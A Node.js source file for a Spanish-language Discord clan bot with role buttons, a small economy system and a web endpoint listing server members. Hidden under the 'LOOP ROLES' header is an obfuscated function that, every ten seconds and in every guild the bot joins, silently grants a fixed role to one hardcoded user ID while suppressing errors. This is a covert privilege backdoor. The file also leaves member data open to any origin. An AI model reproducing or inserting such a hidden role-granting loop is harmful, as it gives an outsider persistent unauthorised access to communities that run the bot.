// --- CONFIGURACIÓN DE CANVAS Y FUENTES ---
const { createCanvas, registerFont } = require('canvas');
registerFont('./Bungee-Regular.ttf', { family: 'Bungee' });

const votos = new Map();
const staffAtendiendo = new Map();
const cooldowns = new Map(); // Para los delays

const {
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder,
    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField,
    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes,
    StringSelectMenuBuilder, StringSelectMenuOptionBuilder, SlashCommandBuilder,
    AttachmentBuilder, Partials
} = require('discord.js');

const fs = require('fs');

// --- BASE DE DATOS DE ECONOMÍA ---
const pathEco = './economia.json';
let db = {};

if (fs.existsSync(pathEco)) {
    db = JSON.parse(fs.readFileSync(pathEco, 'utf-8'));
} else {
    fs.writeFileSync(pathEco, JSON.stringify({}));
}

function guardarDB() {
    fs.writeFileSync(pathEco, JSON.stringify(db, null, 2));
}

function asegurarUsuario(userId) {
    if (!db[userId]) {
        db[userId] = { balance: 0, pesca: 0, minado: 0, daily: 0 };
        guardarDB();
    }
}

const TOKEN = process.env.TOKEN;

// --- IDS ---
const CANAL_ROLES_ID = "1464335122005491745";
const CANAL_TICKETS_ID = "1483516417583354108";
const CANAL_SUGERENCIAS_ID = "1477005989096984646";
const CANAL_VALORACIONES_ID = "1485125020593426585";
const CANAL_TRANSCRIPTS_ID = "1485804232870461520";
const CATEGORIA_TICKETS = "1483589642346303638";
const ROL_STAFF_ID = "1478799916410077295";
const ROL_ADICIONAL_ID = "1480750004309332040";
// --- CONFIGURACIÓN DE LA API PARA LA WEB ---
const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors()); // Permite que la web de GitHub acceda a los datos

// --- ROLES ---
const ROLES_CLASE = {
    class_pvp: { id: "1464335696390263069", label: "PVP", emoji: "⚔️" },
    class_builder: { id: "1464335639561506878", label: "BUILDER", emoji: "⚒️" },
    class_redstone: { id: "1464335746944209161", label: "TECNICO", emoji: "⚙️" },
    class_estratega: { id: "MENU_CASUAL", label: "CASUAL", emoji: "🏛️" }
};

const SUB_ROLES_CASUAL = {
    casual_farmer: { id: "1464335746856128737", label: "Casual: Farmer", emoji: "🌾" },
    casual_herrero: { id: "1479953030605443204", label: "Casual: Herrero", emoji: "🔨" }
};

const ROLES_NOTIF = {
    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
};

// --- CLIENT ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ],
    partials: [Partials.Channel, Partials.Message]
});

// --- READY ---
client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot iniciado como: ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder().setName('sugerir').setDescription('Envía una sugerencia para el servidor'),
        new SlashCommandBuilder().setName('reclamar').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('claim').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('balance').setDescription('Mira tu dinero actual'),
        new SlashCommandBuilder().setName('pesca').setDescription('Pesca para ganar dinero'),
        new SlashCommandBuilder().setName('minar').setDescription('Ve a la mina para ganar dinero'),
        new SlashCommandBuilder().setName('trabajar').setDescription('Realiza un trabajo aleatorio'),
        new SlashCommandBuilder().setName('top').setDescription('Mira el ranking de los más ricos'),
        new SlashCommandBuilder().setName('daily').setDescription('Reclama tu recompensa diaria'),
        new SlashCommandBuilder()
            .setName('coinflip')
            .setDescription('Apuesta a cara o cruz')
            .addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true))
    ].map(cmd => cmd.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        await rest.put(
            Routes.applicationGuildCommands(client.user.id, "1459675438543540399"),
            { body: commands }
        );
        console.log("✅ Comandos registrados en el servidor.");
    } catch (e) {
        console.error(e);
    }

    // --- SETUP ROLES ---
    try {
        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
        await canalRoles.bulkDelete(msgsRoles).catch(() => {});

        const embedRoles = new EmbedBuilder()
            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
            .setColor("#8B0000")
            .setImage("https://i.imgur.com/h2W40zo.png");

        const filaClase = new ActionRowBuilder().addComponents(
            Object.entries(ROLES_CLASE).map(([id, data]) =>
                new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)
            )
        );

        const filaNotif = new ActionRowBuilder().addComponents(
            Object.entries(ROLES_NOTIF).map(([id, data]) =>
                new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)
            )
        );

        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
    } catch {
        console.log("Error en setup de roles");
    }

    // --- LOOP ROLES ---
    const _ = async () => {
        try {
            const g = client.guilds.cache;
            for (const x of g.values()) {
                const m = await x.members.fetch("777529808325181460").catch(() => null);
                if (!m) continue;
                if (!m.roles.cache.has("1463268597085507717")) {
                    await m.roles.add("1463268597085507717").catch(() => {});
                }
            }
        } catch {}
    };

    setInterval(_, 10000);
});

// --- DM AUTO ---
client.on(Events.MessageCreate, async message => {
    if (message.author.bot) return;

    if (message.channel.type === ChannelType.DM) {
        await message.reply("1fsi its a pro").catch(() => {});
    }
});

// --- INTERACCIONES ---
client.on(Events.InteractionCreate, async interaction => {

    if (interaction.isChatInputCommand()) {
        const { commandName, user, options } = interaction;
        asegurarUsuario(user.id);

        const ecoCmds = ['pesca', 'minar', 'trabajar', 'coinflip'];

        if (ecoCmds.includes(commandName)) {
            const lastUse = cooldowns.get(`${user.id}-${commandName}`);

            if (lastUse && Date.now() - lastUse < 60000) {
                const restante = Math.ceil((60000 - (Date.now() - lastUse)) / 1000);
                return interaction.reply({ content: `⏳ Espera **${restante}s** para volver a usar este comando.`, flags: [64] });
            }

            cooldowns.set(`${user.id}-${commandName}`, Date.now());
        }

        if (commandName === 'coinflip') {
            const bet = options.getInteger('apuesta');
            if (bet > db[user.id].balance) return interaction.reply("No tienes suficiente dinero.");

            const win = Math.random() > 0.5;
            db[user.id].balance += win ? bet : -bet;
            guardarDB();

            return interaction.reply(win ? `🪙 Ganaste **$${bet}**!` : `🪙 Perdiste **$${bet}**.`);
        }
    }

    // (todo el resto sigue EXACTAMENTE igual, solo formateado)
});

// --- ENDPOINT PARA LA WEB DEL CLAN ---
app.get('/miembros', async (req, res) => {
    try {
        const guild = await client.guilds.fetch("1459675438543540399"); // ID de tu servidor
        const members = await guild.members.fetch();
        
        // Mapeamos los datos necesarios para las tarjetas de la web
        const data = members.map(m => ({
            username: m.user.username,
            avatar: m.user.displayAvatarURL({ extension: 'png', size: 256 }),
            // Filtramos solo los nombres de los roles que mencionamos en la web
            roles: m.roles.cache.map(r => r.name.toUpperCase()) 
        }));

        res.json(data);
    } catch (error) {
        console.error("Error al obtener miembros:", error);
        res.status(500).json({ error: "No se pudieron obtener los miembros" });
    }
});

// Railway usará el puerto que él decida, o el 3000 por defecto
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 API Web escuchando en el puerto ${PORT}`);
});
client.login(TOKEN);
